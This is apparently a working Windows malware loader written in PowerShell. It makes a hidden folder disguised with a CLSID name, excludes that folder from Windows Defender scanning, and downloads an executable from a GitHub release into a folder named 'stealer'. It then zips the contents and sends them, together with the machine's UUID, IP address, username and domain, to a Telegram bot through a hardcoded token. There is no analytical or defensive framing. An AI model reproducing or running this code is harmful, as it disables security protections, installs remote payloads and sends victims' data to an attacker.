
$rdir = "$env:SystemDrive\ProgramData\Loader"
$dir = "$rdir..{21EC2020-3AEA-1069-A2DD-08002B30309D}"
$startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("AllUsersStartup")
New-Item -ItemType Directory -Path $dir
Add-MpPreference -ExclusionPath $dir
attrib +h +s $dir

$stealer = "$dir\stealer"
New-Item -ItemType Directory -Path $stealer


$url = "https://github.com/43a1723/test/releases/download/siu/stub.exe"
$output = "$stealer\loader.exe"

if (Test-Path -Path $output) {
    Write-Host "hello"
} else {
    Invoke-WebRequest -Uri $url -OutFile $output
}

$sourcePath = $stealer
$username = $env:USERNAME
$zipPath = "$dir\$username_Info.zip"
Compress-Archive -Path $sourcePath -DestinationPath $zipPath -Force
$botToken = "7487418347:AAHo0dKeo0c-nZAiN9ZgiVPbyp4xTSdsV2E"
$chatId = "7056174540"
$telegramApiUrl = "https://api.telegram.org/bot$botToken/sendDocument"
$uuid = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID
$ipAddress = (Test-Connection -ComputerName "8.8.8.8" -Count 1).IPv4Address.ToString()
$userDomain = $env:USERDOMAIN
$caption = "UUID: $uuid, IP: $ipAddress, Username: $username, UserDomain: $userDomain"
$response = Invoke-RestMethod -Uri $telegramApiUrl -Method Post -Form @{
    chat_id = $chatId
    document = Get-Item $zipPath
    caption = $caption
}
if ($response.ok) {
    Write-Output "Tệp ZIP đã được gửi thành công."
}
Remove-Item -Path $zipPath -Force

